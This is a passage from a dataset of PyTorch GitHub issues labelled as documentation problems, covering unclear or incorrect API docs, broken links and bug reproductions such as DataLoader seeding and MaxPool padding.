# Return something based on x\r\n```\r\n\r\nIn this case, the warning is extremely annoying, since its suggestion to use `Tensor.clone().detach()` instead only works if the input is already a tensor.  Furthermore, it isn't clear why a warning is necessary here at all - it might as well be saying \"Warning: this function works as documented!\"\r\n\r\n## Pitch\r\n\r\n<!-- A clear and concise description of what you want to happen. -->\r\n\r\nPlease eliminate this warning.  If necessary, incorporate its advice into the documentation for `torch.tensor()` instead.\r\n\r\n## Alternatives\r\n\r\n<!-- A clear and concise description of any alternative solutions or features you've considered, if any. -->\r\n\r\nPerhaps this warning is suggesting that `torch.tensor` will be deprecated or modified in the future?  If so, it would be better to incorporate those plans into the documentation.\r\n\r\n## Additional context\r\n\r\n<!-- Add any other context or screenshots about the feature request here. -->\r\n\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nLatest: https://pytorch.org/docs/stable/autograd.html (no record_function)\r\nV1.4: https://pytorch.org/docs/1.4.0/autograd.html (record_function documented)\n\ncc @jlin27"},{"labels":[null,"documentation",null],"text":"Including creating the appropriate PyCapsule (pycapsule stuff seems to not be part of standard? or not mentioned explicitly?) and if its destructor is needed.\r\n\r\nI recently did this work to interop with ffmpeg and made two examples: \r\n\r\n1. https://github.com/vadimkantorov/pydlpack (relevant PyCapsule code here: https://github.com/vadimkantorov/pydlpack/blob/master/dlpack.py#L91)\r\n2. https://github.com/vadimkantorov/readaudio\r\n\r\nWhile memory management in this scenario is hard to do completely right, it still may be useful for the cases when full-blown PyTorch Extension would require learning Torch C++ API and working with C++.\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nConsider the documentation for Conv2d against 1.7.0:\r\n`\r\ntorch.nn.Conv2d(in_channels: int, out_channels: int, kernel_size: Union[T, Tuple[T, T]], stride: Union[T, Tuple[T, T]] = 1, padding: Union[T, Tuple[T, T]] = 0, dilation: Union[T, Tuple[T, T]] = 1, groups: int = 1, bias: bool = True, padding_mode: str = 'zeros')\r\n`\r\n\r\nThe \"T\" type is never defined and not particularly useful for documentation, even if it is the correct mypy type.  We should have a better strategy here.\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nIn the API docs, the function names should NOT be capitalized. For example, in https://pytorch.org/docs/master/generated/torch.set_flush_denormal.html#torch.set_flush_denormal\r\n\r\nwe should not write\r\n\r\n```\r\nTORCH.SET_FLUSH_DENORMAL\r\n```\r\n\r\nbut \r\n\r\n```\r\ntorch.set_flush_denormal\r\n```\r\n\r\nPython - like many other programming languages - is case sensitive.\n\ncc @jlin27"},{"labels":["documentation",null,null],"text":"Documentation pretends that weights and bias are initialized uniformly in +-1/sqrt(in), whereas the code uses kaiming for weights and a kaiming variant for biases.\n\ncc @jlin27 @albanD @mruberry"},{"labels":[null,"documentation",null],"text":"## üìö Documentation\r\n\r\nWe occasionally see users post about performance issues when using NCCL for distributed training ([example](https://discuss.pytorch.org/t/distributeddataparallel-on-multiple-gpu-nodes-slower-than-one-gpu-node/75984), [example](https://github.com/pytorch/fairseq/issues/789)). Often tuning some NCCL environment variables such as `NCCL_MIN_NRINGS`, `NCCL_SOCKET_NTHREADS` can help with the performance depending on the network, so we should document these suggestions in our [distributed docs](https://pytorch.org/docs/stable/distributed.html) to help users self-troubleshoot performance issues. \n\ncc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @xush6528 @osalpekar @jiayisuse @agolynski @jlin27"},{"labels":[null,"documentation",null],"text":"## üêõ Bug\r\n\r\nBuilding the docs for me as an end user (offline documentation) does not work.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. Check out the pytorch repo at tag `v1.5.1`.\r\n1. Create and activate virtual environment: `cd /path/to/pytorch; python3 -m venv .venv; source .venv/bin/activate`\r\n1. Install pytorch version 1.5.1: `pip3 install torch==v1.5.1`\r\n1. Install requirements needed for docs: `cd docs; pip3 install -U -r requirements.txt`\r\n1. Trying to build the docs: `make; make html`\r\n\r\nAll steps together:\r\n```bash\r\ngit clone https://github.com/pytorch/pytorch.git\r\ncd pytorch\r\ngit checkout v1.5.1\r\npython3 -m venv .venv\r\nsource .venv/bin/activate\r\npip3 install torch==v1.5.1\r\ncd docs\r\npip3 install -U -r requirements.txt\r\nmake\r\nmake html\r\n```\r\n\r\nWhen the `make html` step tries to write the output, it fails like this:\r\n```\r\npreparing documents... done\r\nwriting output... [ 23%] distributions                                                                                                                                                                             \r\nException occurred:\r\n  File \"/usr/lib/python3.6/subprocess.py\", line 1364, in _execute_child\r\n    raise child_exception_type(errno_num, err_msg, err_filename)\r\nFileNotFoundError: [Errno 2] No such file or directory: 'katex': 'katex'\r\nThe full traceback has been saved in /tmp/sphinx-err-tsyb3hy5.log, if you want to report the issue to the developers.\r\nPlease also report this if it was a user error, so that a better error message can be provided next time.\r\nA bug report can be filed in the tracker at <https://github.com/sphinx-doc/sphinx/issues>. Thanks!\r\nMakefile:38: recipe for target 'html' failed\r\nmake: *** [html] Error 2\r\n```\r\n\r\n\r\n## Expected behavior\r\n\r\nI expect the build process to work. Other users seemed to have problems with it before [here](https://discuss.pytorch.org/t/generate-offline-documentation/64643/6) and [here](https://discuss.pytorch.org/t/accessing-pytorch-documentation-offline/20453), but I already avoided the mistakes made there.\r\n\r\n## Environment\r\n\r\nGenerated output from your\r\n[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py).\r\n\r\n```\r\nPyTorch version: 1.5.1\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.2\r\n\r\nOS: Ubuntu 18.04.4 LTS\r\nGCC version: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0\r\nCMake version: version 3.10.2\r\n\r\nPython version: 3.6\r\nIs CUDA available: No\r\nCUDA runtime version: 10.0.130\r\nGPU models and configuration: GPU 0: Quadro P2000\r\nNvidia driver version: 410.104\r\ncuDNN version: Probably one of the following:\r\n/usr/lib/x86_64-linux-gnu/libcudnn.so.7.3.1\r\n/usr/local/cuda-10.0/targets/x86_64-linux/lib/libcudnn.so.7.4.2\r\n\r\nVersions of relevant libraries:\r\n[pip3] numpy==1.19.1\r\n[pip3] pytorch-sphinx-theme==0.0.24\r\n[pip3] torch==1.5.1\r\n[conda] Could not collect\r\n```\n\ncc @ezyang @zou3519 @jlin27"},{"labels":[null,"documentation",null],"text":"## üìö Documentation\r\n\r\n\"Distributed RPC Framework\" documentation (master version) contains the following note:\r\n\r\n> Please refer to [PyTorch Distributed Overview](https://pytorch.org/docs/master/rpc.html) for a brief introduction to all features related to distributed training.\r\n\r\n<img width=\"976\" alt=\"Screen Shot 2020-07-24 at 12 44 58\" src=\"https://user-images.githubusercontent.com/2459423/88383996-dd0deb00-cdab-11ea-86ed-89def1b30e58.png\">\r\n\r\nThe link behind \"PyTorch Distributed Overview\" is missing.\r\n\r\nI could send a PR with a quick fix, but I can not figure out where is the correct ressource...\r\n\r\ncc @mrshenli "},{"labels":[null,"documentation",null],"text":"It would be nice to have this in docs directly, since loops like `for device in range(torch.cuda.device_count())` are simpler if it is known to return 0 when no CUDA is compiled or it is not available\r\n\r\nIn https://discuss.pytorch.org/t/torch-cuda-device-count-with-no-cuda-compiled-available/90328 it seems so!\n\ncc @ngimel @jlin27"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\nThe original question was posted [here](https://discuss.pytorch.org/t/torch-exp-is-modified-by-an-inplace-operation/90216). As `torch.exp()` leverages its output for calculating its gradient while most other functions use their input, `torch.exp()` has a different behavior when its output is inplaced, which is not natural to users. I understand that this implementation is beneficial to the code efficiency. The description of `torch.exp()` in the document should emphasize this property.\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\n\ncc @jlin27"},{"labels":[null,null,"documentation",null,null,null],"text":"## üêõ Bug\r\n\r\nA segmentation fault occurs when passing an array for `streams` argument.\r\n\r\n## To Reproduce\r\n\r\n```python\r\nimport torch\r\n\r\nx = [[[3, 2, 3],[1, 3, 4]],\r\n       [[3, 1, 2],[3, 2, 4]],\r\n       [[4, 4, 2], [1, 1, 1]]] \r\ntorch.cuda.comm.scatter(torch.tensor(x), [1], chunk_sizes=None, dim=0, streams=[1, 2])\r\n```\r\n\r\n## Expected behavior\r\n\r\nNo segfault. There is no documentation for `streams` argument, so it is not clear what the function expects for an input other than the default value(None). \r\n\r\n## Environment\r\nPyTorch version: 1.5.0\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.1\r\n\r\nOS: Ubuntu 18.04.4 LTS\r\nGCC version: Could not collect\r\nCMake version: version 3.14.0\r\n\r\nPython version: 3.7\r\nIs CUDA available: No\r\nCUDA runtime version: No CUDA\r\nGPU models and configuration: No CUDA\r\nNvidia driver version: No CUDA\r\ncuDNN version: No CUDA\r\n\r\nVersions of relevant libraries:\r\n[pip] numpy==1.18.1\r\n[pip] torch==1.5.0\r\n[pip] torchvision==0.6.0a0+82fd1c8\r\n[conda] blas 1.0 mkl\r\n[conda] cudatoolkit 10.1.243 h6bb024c_0\r\n[conda] mkl 2020.1 217\r\n[conda] mkl-include 2020.1 217\r\n[conda] mkl-service 2.3.0 py37he904b0f_0\r\n[conda] mkl_fft 1.0.15 py37ha843d7b_0\r\n[conda] mkl_random 1.1.0 py37hd6b4f25_0\r\n[conda] numpy 1.18.1 py37h4f9e942_0\r\n[conda] numpy-base 1.18.1 py37hde5b4d6_1\r\n[conda] pytorch 1.5.0 py3.7_cuda10.1.243_cudnn7.6.3_0 pytorch\r\n[conda] torchvision 0.6.0 py37_cu101 pytorch\r\n\n\ncc @ezyang @gchanan @zou3519 @ngimel @jlin27"},{"labels":["documentation",null],"text":"https://pytorch.org/docs/master/cuda.html :\r\n\r\nBoth reset_peak_stats and reset_peak_memory_stats are mentioned, but no docs are available.\n\ncc @jlin27"},{"labels":["documentation",null],"text":"https://pytorch.org/docs/master/tensors.html?highlight=narrow_copy#torch.Tensor.narrow_copy:\r\n\r\n![image](https://user-images.githubusercontent.com/1041752/87787192-83ea0880-c83b-11ea-9cfa-fc7b78c59591.png)\r\n\r\nMaybe worth having some assert/search that docs have no backticks (usually, it's an indicator of markdown problem)\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## üêõ Bug\r\n\r\nI could not find this in the documentation, but it seems like `torch.cuda.BoolTensor` actually uses a byte for each element instead of a bit.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n```python\r\nimport torch\r\nx = torch.empty([], device=\"cuda\") # load something on GPU to get a baseline\r\n# running nvidia-smi, I see the GPU has 715 MiB of RAM in use\r\n# let's create a tensor which should take 10 MiB:\r\nx = torch.empty(10*8*1024**2, dtype=torch.bool, device=\"cuda\")\r\nassert x.element_size() == 1\r\n# running nvidia-smi, the GPU has 795 MiB of RAM used, or ~ 80 MiB additional (instead of the 10 MiB expected)\r\n```\r\n\r\nChecking repeatedly with different sizes of tensors indicated that a `torch.cuda.BoolTensor` takes 8 bits per element on GPU.\r\n\r\n## Expected behavior\r\n\r\nEither `torch.cuda.BoolTensor` should only take 1 bit per element (not sure if there is a GPU limitation here) or `x.element_size()` should return 8\r\n\r\n## Environment\r\n\r\nPyTorch version: 1.5.1\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.1\r\n\r\nOS: CentOS Linux release 7.6.1810 (Core)\r\nGCC version: (GCC) 4.8.5 20150623 (Red Hat 4.8.5-36)\r\nCMake version: version 2.8.12.2\r\n\r\nPython version: 3.7\r\nIs CUDA available: Yes\r\nCUDA runtime version: 10.1.168\r\nGPU models and configuration:\r\nGPU 0: GeForce RTX 2080 Ti\r\n\r\nNvidia driver version: 418.87.00\r\ncuDNN version: Could not collect\r\n\r\nVersions of relevant libraries:\r\n[pip3] numpy==1.18.5\r\n[pip3] pytorch-utils==0.1\r\n[pip3] torch==1.5.1\r\n[conda] blas                      1.0                         mkl\r\n[conda] cudatoolkit               10.1.243             h6bb024c_0\r\n[conda] mkl                       2020.1                      217\r\n[conda] mkl-service               2.3.0            py37he904b0f_0\r\n[conda] mkl_fft                   1.1.0            py37h23d657b_0\r\n[conda] mkl_random                1.1.1            py37h0573a6f_0\r\n[conda] numpy                     1.18.5           py37ha1c710e_0\r\n[conda] numpy-base                1.18.5           py37hde5b4d6_0\r\n[conda] pytorch                   1.5.1           py3.7_cuda10.1.243_cudnn7.6.3_0    pytorch\r\n[conda] pytorch-utils             0.1                       dev_0    <develop>\n\ncc @jlin27"},{"labels":["documentation",null,null,null],"text":"# üìö Documentation\r\n\r\n## PyTorch docs\r\n\r\nWhat's going on with `momentum` in BatchNorm? `0.9` of momentum means I keep `0.9` of the old stuff and add `0.1` of the new one. Why is it reversed here? `momentum` equal `0` means I'm running with no memory of the past.\r\n\r\nAlso, the default value is way off! It should be `0.99`, not `0.9`.\r\n\r\n![image](https://user-images.githubusercontent.com/2119355/87723066-34e29b80-c787-11ea-86c1-1eea693fd377.png)\r\n![image](https://user-images.githubusercontent.com/2119355/87722818-c43b7f00-c786-11ea-9452-d8b1d503a2cc.png)\r\n\r\n## Keras docs\r\n\r\nA more sensible approach.\r\n\r\n![image](https://user-images.githubusercontent.com/2119355/87723043-298f7000-c787-11ea-84fe-3a5f09f5c2c8.png)\r\n\n\ncc @jlin27 @albanD @mruberry"},{"labels":[null,"documentation",null,null,null],"text":"## üêõ Bug\r\n\r\n<!-- A clear and concise description of what the bug is. -->\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1.\r\n1.\r\n1.\r\n\r\n<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->\r\n\r\n## Expected behavior\r\n\r\n<!-- A clear and concise description of what you expected to happen. -->\r\n\r\n## Environment\r\n\r\nPlease copy and paste the output from our\r\n[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py)\r\n(or fill out the checklist below manually).\r\n\r\nYou can get the script and run it with:\r\n```\r\nwget https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py\r\n# For security purposes, please check the contents of collect_env.py before running it.\r\npython collect_env.py\r\n```\r\n\r\n - PyTorch Version (e.g., 1.0):\r\n - OS (e.g., Linux):\r\n - How you installed PyTorch (`conda`, `pip`, source):\r\n - Build command you used (if compiling from source):\r\n - Python version:\r\n - CUDA/cuDNN version:\r\n - GPU models and configuration:\r\n - Any other relevant information:\r\n\r\n## Additional context\r\n\r\n<!-- Add any other context about the problem here. -->\r\n\n\ncc @ezyang @gchanan @zou3519 @jlin27 @albanD @mruberry"},{"labels":[null,"documentation",null,null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nHello, I noticed this older issue https://github.com/pytorch/pytorch/issues/6662 is still open and looked through this PR https://github.com/pytorch/pytorch/pull/24435 about adding `doctest` to jit. If it would be helpful I can work on other parts of the docs to convert code blocks to use `doctest`. Currently it seems there are over 400 code blocks in the docs using the format `Example::` that are not being tested, e.g. a bunch are in this [file](https://github.com/pytorch/pytorch/blob/master/torch/_torch_docs.py). \n\ncc @jlin27 @mruberry @VitalyFedyunin"},{"labels":["documentation",null,null],"text":"In https://pytorch.org/docs/stable/_modules/torch/optim/adam.html#Adam, towards the end, we have\r\n\r\n```\r\n                    denom = (exp_avg_sq.sqrt() / math.sqrt(bias_correction2)).add_(group['eps'])\r\n```\r\n\r\nHowever, the [paper](https://arxiv.org/pdf/1412.6980.pdf) uses epsilon by adding it to `exp_avg_sq.sqrt()`; not to a whole fraction.\r\nThis is always the case, in both the Algorithm 1 formulation, as well as the one before Section 2.1.\r\n\r\nWhat pytorch does is that it uses `epsilon * sqrt(1 - beta_2^t)` instead of just `epsilon`, for the paper's algoritm formulation.\n\ncc @jlin27 @vincentqb"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n![image](https://user-images.githubusercontent.com/33288114/87407914-60ce1780-c5f5-11ea-80eb-4fdb8c374463.png)\r\n\r\nThis formula confuses me because this formula does not look like a matrix formula. I can't determine whether W or x is a matrix or a vector.I think your formula does not consider the consistency of matrix dimensions.\r\n\r\nAccording to the relevant weights and input dimensions provided by the official documentation Ôºå I think the correct formula should be:\r\n![image](https://user-images.githubusercontent.com/33288114/87409139-1e0d3f00-c5f7-11ea-953e-3fe0ffcb727f.png)\r\n\r\n\r\n\n\ncc @jlin27"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\nFor the parameter 'dim', the documentation says 'If the value is None, matrix norm will be calculated when the input tensor only has two dimensions, vector norm will be calculated when the input tensor only has one dimension. If the input tensor has more than two dimensions, the vector norm will be applied to last dimension.'\r\n\r\nMy code is:\r\nA = torch.randn(4, 3, 3)\r\nB = torch.norm(A)\r\nprint(B)\r\nThe result is:\r\ntensor(5.7707)\r\n\r\nIt seems that torch.norm computes the sum of the square of every number in the tensor A and returns the square root of the sum. However, the documentation says ' the vector norm will be applied to the last dimension'. I think what the function does contradicts the documentation. By the way, I prefer what the function does, because computing the Frobenius norm of a three or more dimensional tensor is useful. So, I think to change the documentation is a good idea, instead of to fix the implementation of torch.norm.\n\ncc @jlin27"},{"labels":[null,"documentation",null],"text":"Old title: Random seed of numpy is reset to the same value inside DataLoader workers\r\n\r\n## üêõ Bug\r\n\r\n<!-- A clear and concise description of what the bug is. -->\r\nI‚Äôm using an IterableDataset inside a DataLoader (with multiple workers).  My IterableDataset code calls numpy.random functions. In each epoch and for each worker, I noticed the sequence of values returned by numpy.random functions is exactly the same.  This is unexpected since numpy would normally seed the random generator when it is initialized.\r\n\r\nExample use case: the IterableDataset uses numpy.random to choose image crops - expected to be, well, *random*, not exactly the same for each image for each epoch.\r\n\r\nNote: this happens without calling torch.manual_seed() or numpy.random.seed(), and without doing anything to make things deterministic.  Even if determinism is the default PyTorch policy, the workers should not get re-seeded each epoch.\r\n\r\n## To Reproduce\r\n\r\n<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->\r\n\r\n```\r\nimport torch\r\nimport numpy as np\r\nfrom torch.utils.data import DataLoader, Dataset\r\n\r\nclass TestIterableDataset(torch.utils.data.IterableDataset):\r\n    def __init__(self):\r\n        super(TestIterableDataset).__init__()\r\n\r\n    def __iter__(self):\r\n        worker_info = torch.utils.data.get_worker_info()\r\n        for n in range(10):\r\n            yield(worker_info.id, np.random.randint(1000000))\r\n            \r\nds = TestIterableDataset()\r\n\r\nfor worker_id, number in DataLoader(ds, batch_size=4, num_workers=2):\r\n    print(worker_id, number)\r\n\r\nfor worker_id, number in DataLoader(ds, batch_size=4, num_workers=2):\r\n    print(worker_id, number)\r\n```\r\n\r\nThis prints the same result every time it is run, and the same sequence of random numbers from each worker:\r\n```\r\n# tensor([0, 0, 0, 0]) tensor([ 68669, 230721, 801136, 274196])\r\n# tensor([1, 1, 1, 1]) tensor([ 68669, 230721, 801136, 274196])\r\n# tensor([0, 0, 0, 0]) tensor([617084, 429589, 436968, 718987])\r\n# tensor([1, 1, 1, 1]) tensor([617084, 429589, 436968, 718987])\r\n# tensor([0, 0]) tensor([150977,  59469])\r\n# tensor([1, 1]) tensor([150977,  59469])\r\n```\r\n\r\n## Expected behavior\r\n\r\n<!-- A clear and concise description of what you expected to happen. -->\r\n\r\nNumpy random generator would seed itself from /dev/urandom when RandomState is initialized (different in each worker).\r\n\r\n## Environment\r\n\r\nPyTorch version: 1.5.0\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.1\r\n\r\nOS: Ubuntu 18.04.4 LTS\r\nGCC version: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0\r\nCMake version: version 3.13.3\r\n\r\nPython version: 3.6\r\nIs CUDA available: Yes\r\nCUDA runtime version: 10.0.130\r\nGPU models and configuration: GPU 0: Tesla T4\r\nNvidia driver version: 440.33.01\r\ncuDNN version: Probably one of the following:\r\n/usr/local/cuda-10.1/targets/x86_64-linux/lib/libcudnn.so.7.6.5\r\n/usr/local/cuda-10.2/targets/x86_64-linux/lib/libcudnn.so.7.6.5\r\n\r\nVersions of relevant libraries:\r\n[pip3] numpy==1.15.4\r\n[conda] blas                      1.0                         mkl  \r\n[conda] cudatoolkit               10.1.243             h6bb024c_0  \r\n[conda] mkl                       2020.0                      166  \r\n[conda] mkl-service               2.3.0            py36he904b0f_0  \r\n[conda] mkl_fft                   1.0.15           py36ha843d7b_0  \r\n[conda] mkl_random                1.1.0            py36hd6b4f25_0  \r\n[conda] numpy                     1.18.1           py36h4f9e942_0  \r\n[conda] numpy-base                1.18.1           py36hde5b4d6_1  \r\n[conda] numpydoc                  0.9.2                      py_0  \r\n[conda] pytorch                   1.5.0           py3.6_cuda10.1.243_cudnn7.6.3_0    pytorch\r\n[conda] torchvision               0.6.0                py36_cu101    pytorch\r\n[conda] torchviz                  0.0.1                    pypi_0    pypi\r\n\r\n\r\n\r\n\r\ncc @SsnL @VitalyFedyunin @jlin27"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\nDocumentation for [ConvTranspose1d layer](https://pytorch.org/docs/master/generated/torch.nn.ConvTranspose1d.html) does not contain even brief explanation of how channels are treated and how number of channels affect processing. \r\n\r\nSame goes for [Conv1d layer](https://pytorch.org/docs/master/generated/torch.nn.Conv1d.html) but it was at least covered in [this discussion](https://discuss.pytorch.org/t/understanding-convolution-1d-output-and-input/30764/2) and is somewhat more obvious. With transposed convolution it is easy to find dozens of sites, books and animations explainig how it happens but I have not found a single mention that happens when there is multiple input channels and how they are reduced to single output channel. There are several questions on discuss.pytorch.org which seem relevant:\r\n1. https://discuss.pytorch.org/t/how-to-use-torch-nn-convtranspose1d-to-take-the-derivative-of-torch-nn-conv1d-function/32620\r\n2.  https://discuss.pytorch.org/t/upsampling-convtranspose2d-getting-the-original-tensor-size/51936\r\n3.  https://discuss.pytorch.org/t/understanding-conv2d-and-convtranspose2d/42142\r\n4. https://discuss.pytorch.org/t/convtranspose2d-weight-shape/52528\r\n\r\nIn the end, I just created ConvTranspose1d layer, feed it with constant values and hypothesized that it:\r\n1. applies transposed convolution to each input channel independently\r\n2. sum results for each channels, adds bias and push it to output channel\r\n3. multiple output channels just use different set of kernels and produce different values\r\n\n\ncc @jlin27"},{"labels":[null,"documentation",null,null,null],"text":"## üêõ Bug\r\n\r\nPer [documentation of MaxPool](https://pytorch.org/docs/stable/nn.html#maxpool2d), input is \"implicitly zero-padded on both sides for padding number of points.\" The implementation differs by implicitly padding with identity elements, rather than zero.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. Create a tensor of signed type, filled with negative values.\r\n1. Invoke a MaxPool with positive padding.\r\n1. Compare against ground truth, either computed by hand or created by explicit zero-padding.\r\n\r\nMinimal code sample / unit test:\r\n```\r\n# Maxpool of non-positive values, such that padding is included in the computation of each result element.\r\nimport torch\r\nr = torch.nn.functional.max_pool2d(-torch.rand(2,2,64), kernel_size=[3,3], padding=1)\r\nassert torch.equal(r, torch.zeros_like(r))\r\n```\r\n\r\n## Expected behavior\r\n\r\nAccording to documentation, the values near the edge will be computed using the implicit zero-padding. The maximum of a negative number and zero is zero, so such values _ought_ to be zero. In the provided example, the assert should not fire.\r\n\r\nWhen the code sample above is run, however, the assert fires.\r\n\r\n## Environment\r\n\r\nInformation from collect_env.py:\r\n\r\n- PyTorch version: 1.5.1\r\n- Is debug build: No\r\n- CUDA used to build PyTorch: 10.2\r\n\r\n- OS: Microsoft Windows 10 Home\r\n- GCC version: (x86_64-win32-seh-rev0, Built by MinGW-W64 project) 8.1.0\r\n- CMake version: version 3.14.1\r\n\r\n- Python version: 3.8\r\n- Is CUDA available: Yes\r\n- CUDA runtime version: Could not collect\r\n- GPU models and configuration: GPU 0: GeForce GTX 960M\r\n- Nvidia driver version: 442.50\r\n- cuDNN version: Could not collect\r\n\r\n- Versions of relevant libraries:\r\n- [pip] Could not collect\r\n- [conda] Could not collect\r\n\r\n## Additional context\r\n\r\nN/A\n\ncc @ezyang @gchanan @zou3519 @jlin27 @albanD @mruberry"},{"labels":[null,"documentation",null],"text":"https://pytorch.org/docs/master/generated/torch.bmm.html#torch.bmm:\r\n`torch.bmm(input, mat2, deterministic=False, out=None) ‚Üí Tensor`\r\n\r\n`mat2` is quite strange\r\n\r\nhttps://pytorch.org/docs/master/tensors.html?highlight=bmm#torch.Tensor.bmm:\r\n`bmm(batch2) ‚Üí Tensor`\r\n\r\n`batch2` is strange as well (and does not even match torch.bmm)\r\n\r\nIt seems that it's a remnant of torch.addbmm, there batch1/batch2 make more sense. But combinations input/mat2 and self/batch2 don't make much sense\r\n\r\nSame for torch.mm/tensor.mm\n\ncc @jlin27"},{"labels":[null,"documentation",null],"text":"## üêõ Bug\r\n\r\n<!-- A clear and concise description of what the bug is. -->\r\ncompiling incorrectly fails with the error `error: passing ‚Äòat::Tensor‚Äô as ‚Äòthis‚Äô argument discards qualifiers [-fpermissive]` (aka const correctness violated)\r\n\r\nThis follows the example from the docs (https://pytorch.org/cppdocs/api/classat_1_1_tensor.html#_CPPv4N2at6Tensor4gradEv)\r\n\r\n> `Tensor &grad()`\r\n> Return a mutable reference to the gradient. \r\n> This is conventionally used as `t.grad() = x` to set a gradient to a completely new tensor.\r\n\r\n> `void backward(...)`\r\n> ...\r\n> This function accumulates gradients in the leaves - you might need to zero them before calling it.\r\n\r\nbut fails to compile\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. call backward()\r\n2. set the grad to zero\r\n3. compile\r\n\r\n<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->\r\n```\r\n...error: passing ‚Äòat::Tensor‚Äô as ‚Äòthis‚Äô argument discards qualifiers [-fpermissive]\r\n     z_grad = 0;\r\n              ^\r\n```\r\n```\r\n#include <torch/torch.h>                                                                                                                                                                                           \r\n#include <iostream>                                                                                                                                                                                                \r\n#include <vector>                                                                                                                                                                                                  \r\n                                                                                                                                                                                                                   torch::Device get_device()                                                                                                                                                                                         \r\n{                                                                                                                                                                                                                  \r\n    torch::Device device = torch::kCPU;                                                                                                                                                                            \r\n    if (torch::cuda::is_available()) {                                                                                                                                                                                     std::cout << \"CUDA is available! Training on GPU.\" << std::endl;                                                                                                                                           \r\n        device = torch::kCUDA;                                                                                                                                                                                     \r\n    }                                                                                                                                                                                                              \r\n    return device;                                                                                                                                                                                                 \r\n}                                                                                                                                                                                                                  \r\n                                                                                                                                                                                                                   \r\nint main() {                                                                                                                                                                                                       \r\n    using torch::Tensor;                                                                                                                                                                                           \r\n    auto device = get_device();                                                                                                                                                                                    \r\n    auto options =                                                                                                                                                                                                 \r\n        torch::TensorOptions()                                                                                                                                                                                     \r\n        .dtype(torch::kFloat32)                                                                                                                                                                                    \r\n        .layout(torch::kStrided)                                                                                                                                                                                   \r\n        .device(device)                                                                                                                                                                                            \r\n        .requires_grad(true);                                                                                                                                                                                      \r\n                                                                                                                                                                                                                                                                                                                                                              \r\n    std::vector<float> z_vec = {1,2,3};                                                                                                                                                                                                                                                                   \r\n    Tensor z = torch::from_blob(z_vec.data(), {z_vec.size()}).to(device);                                                                                                                                          \r\n                                                                                                                                                                                                                   \r\n    Tensor z_times_2 = 2 * z;                                                                                                                                                                                      \r\n    z_times_2.backward({}, true); // keep graph                                                                                                                                                                    \r\n    Tensor& z_grad = z.grad(); // mutable, non-const ref\r\n    std::cout << z << std::endl;                                                                                                                                                                                   \r\n    std::cout << z_grad << std::endl;                                                                                                                                                                              \r\n    z_grad = 0;                                                                                                                                                                                                    \r\n    std::cout << z_grad << std::endl;                                                                                                                                                                              \r\n}\r\n```\r\nfails to compile with the error above, identifying `z_grad = 0;` as the problem   \r\n\r\nExactly as used in the docs, `z.grad() = 0` does not work either.\r\n\r\nEven with const_cast, it still fails to compile.\r\n`const_cast<Tensor&>(z_grad) = 0; ` or alternatively `Tensor& z_grad = const_cast<Tensor&>(z.grad()); // mutable, non-const ref`\r\n\r\nPassing `-fpermissive` to the compiler does allow it to compile, but this should not be necessary\r\n\r\n## Expected behavior\r\n\r\nIt should compile and set the gradient to zero.\r\n\r\n## Environment\r\n\r\n - PyTorch Version (e.g., 1.0): libtorch 1.5.1(stable, linux, libtorch, C++/Java, CUDA 10.2) CXX11 ABI\r\n - OS (e.g., Linux): Linux, Ubuntu 18.04 LTS\r\n - How you installed PyTorch (`conda`, `pip`, source): the downloads page (https://pytorch.org/get-started/locally/) and linking against it (https://download.pytorch.org/libtorch/cu102/libtorch-cxx11-abi-shared-with-deps-1.5.1.zip)\r\n - Build command you used (if compiling from source): not compiled from source\r\n - Python version: irrelevant\r\n - CUDA/cuDNN version: (probably irrelevant) CUDA 10.2, cuDNN 7.6.5\r\n - GPU models and configuration: (probably irrelevant) Quadro P1000\r\n - Additional information: gcc 7.3 (`g++ (Ubuntu 